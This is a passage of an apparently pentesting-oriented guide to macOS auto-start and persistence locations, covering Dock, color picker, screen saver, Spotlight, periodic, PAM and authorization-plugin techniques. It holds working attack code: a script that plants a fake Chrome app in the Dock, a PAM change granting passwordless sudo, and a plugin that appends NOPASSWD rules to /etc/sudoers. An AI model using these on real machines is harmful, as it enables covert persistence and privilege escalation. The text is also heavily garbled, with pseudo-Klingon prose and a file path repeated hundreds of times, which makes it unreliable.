defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

**Social engineering** vItlhutlh **ghaH** **Google Chrome** jatlh 'ej **dock** vItlhutlh 'ej **script** vItlhutlh.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* A very specific action needs to happen
* You will end in another sandbox
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/Library/ColorPickers`
* Root required
* Trigger: Use the color picker
* `~/Library/ColorPickers`
* Trigger: Use the color picker

#### Description & Exploit

**Compile a color picker** bundle with your code (you could use [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) and add a constructor (like in the [Screen Saver section](macos-auto-start-locations.md#screen-saver)) and copy the bundle to `~/Library/ColorPickers`.

Then, when the color picker is triggered your should should be aswell.

Note that the binary loading your library has a **very restrictive sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Useful to bypass sandbox: **No, because you need to execute your own app**
* TCC bypass: ???

#### Location

* A specific app

#### Description & Exploit

An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).

Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you will end in a common application sandbox
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/System/Library/Screen Savers`
* Root required
* **Trigger**: Select the screen saver
* `/Library/Screen Savers`
* Root required
* **Trigger**: Select the screen saver
* `~/Library/Screen Savers`
* **Trigger**: Select the screen saver

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description & Exploit

Create a new project in Xcode and select the template to generate a new **Screen Saver**. Then, are your code to it, for example the following code to generate logs.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
ghItlhvam, vaj vItlhutlhlaHbe'chugh vay' **`com.apple.security.app-sandbox`** vItlhutlhlaHbe'chugh **common application sandbox**.
{% endhint %}

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you will end in an application sandbox
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
* The sandbox looks very limited

#### Location

* `~/Library/Spotlight/`
* **Trigger**: A new file with a extension managed by the spotlight plugin is created.
* `/Library/Spotlight/`
* **Trigger**: A new file with a extension managed by the spotlight plugin is created.
* Root required
* `/System/Library/Spotlight/`
* **Trigger**: A new file with a extension managed by the spotlight plugin is created.
* Root required
* `Some.app/Contents/Library/Spotlight/`
* **Trigger**: A new file with a extension managed by the spotlight plugin is created.
* New app required

#### Description & Exploitation

Spotlight jatlh macOS built-in search feature, designed to provide users with **quick and comprehensive access to data on their computers**.\
To facilitate this rapid search capability, Spotlight maintains a **proprietary database** and creates an index by **parsing most files**, enabling swift searches through both file names and their content.

The underlying mechanism of Spotlight involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins, or **".mdimporter bundles**", which enable Spotlight to understand and index content across a diverse range of file formats.

The plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.

It's possible to **find all the `mdimporters`** loaded running:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
'ej **/Library/Spotlight/iBooksAuthor.mdimporter** jatlhpu' 'ejwI' 'e' vItlhutlh (extensions `.iba` 'ej `.book` mIw):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
ghItlhutlh Plist 'e' 'mdimporter' 'e' check QaQ 'UTTypeConformsTo' entry 'e' vItlhutlh. vaj 'e' built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) 'ej 'oH 'e' specify extensions.

qatlh, System default plugins 'e' vItlhutlh, 'ej 'oH 'e' attacker 'e' files 'e' vItlhutlh 'e' Apple 'e' own 'mdimporters' 'e' jImej.

{% endhint %}

ghItlhutlh 'e' 'mdimporter' vItlhutlh 'e' 'oH 'e' project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) 'ej 'ej 'oH 'e' name, 'ej **`CFBundleDocumentTypes`** 'ej 'oH 'e' **`UTImportedTypeDeclarations`** 'e' vItlhutlh 'e' extension 'e' vItlhutlh 'ej 'ej 'oH 'e' **`schema.xml`** 'e' refelc.\
'ej **'oH** 'e' code 'e' function **`GetMetadataForFile`** 'e' vItlhutlh 'e' payload 'e' jImej 'ej 'oH 'e' processed extension 'e' file 'e' created.

ghItlhutlh 'e' **build 'ej copy** 'e' new `.mdimporter` 'e' **one 'e' thre locations** 'ej 'oH 'e' chech 'e' **loaded** **monitoring the logs** 'ej 'oH 'e' chech **`mdimport -L.`**

### ~~Preference Pane~~

{% hint style="danger" %}
ghItlhutlh 'e' vItlhutlh 'e' working anymore.
{% endhint %}

Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* 'oH 'e' specific user action
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Description

ghItlhutlh 'e' vItlhutlh 'e' working anymore.

## Root Sandbox Bypass

{% hint style="success" %}
ghItlhutlh 'e' start locations 'e' vItlhutlh 'e' **sandbox bypass** 'e' 'ej 'oH 'e' simply execute something 'e' **writing it into a file** 'ej 'oH 'e' **root** 'ej 'ej 'oH 'e' **weird conditions** 'e' vItlhutlh.
{% endhint %}

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* 'ach 'oH 'e' root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* root vItlhutlh
* **Trigger**: 'oH 'e' time comes
* `/etc/daily.local`, `/etc/weekly.local` 'ej `/etc/monthly.local`
* root vItlhutlh
* **Trigger**: 'oH 'e' time comes

#### Description & Exploitation

The periodic scripts (**`/etc/periodic`**) 'e' vItlhutlh 'e' **launch daemons** configured 'e' `/System/Library/LaunchDaemons/com.apple.periodic*`. Note 'oH 'e' scripts stored 'e' `/etc/periodic/` 'e' **executed** 'ej **owner 'e' file,** 'ach 'oH 'e' potential privilege escalation.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

**`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/periodic.conf`** **`/etc/defaults/
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
**/etc/daily.local**, **/etc/weekly.local** or **/etc/monthly.local** files are executed at some point in time. 

{% hint style="warning" %}
Note that the periodic script will be executed as the owner of the script. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you need to be root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* Root always required

#### Description & Exploitation

As PAM is more focused in persistence and malware that on easy execution inside macOS, this blog won't give a detailed explanation, read the writeups to understand this technique better.

Check PAM modules with:
```bash
ls -l /etc/pam.d
```
# /etc/pam.d/sudo

auth       sufficient     pam_tid.so
auth       required       pam_permit.so
auth       required       pam_opendirectory.so
auth       required       pam_deny.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so

This will allow any user to execute sudo without providing a password. Keep in mind that modifying system files like this can have serious security implications and should only be done in controlled environments for testing purposes.
```bash
auth       sufficient     pam_permit.so
```
So **qoQ** will **qoQ** something like this:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* But you need to be root and make extra configs
* TCC bypass: ???

#### Location

* `/Library/Security/SecurityAgentPlugins/`
* Root required
* It's also needed to configure the authorization database to use the plugin

#### Description & Exploitation

You can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Qap** the bundle to the location to be loaded:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
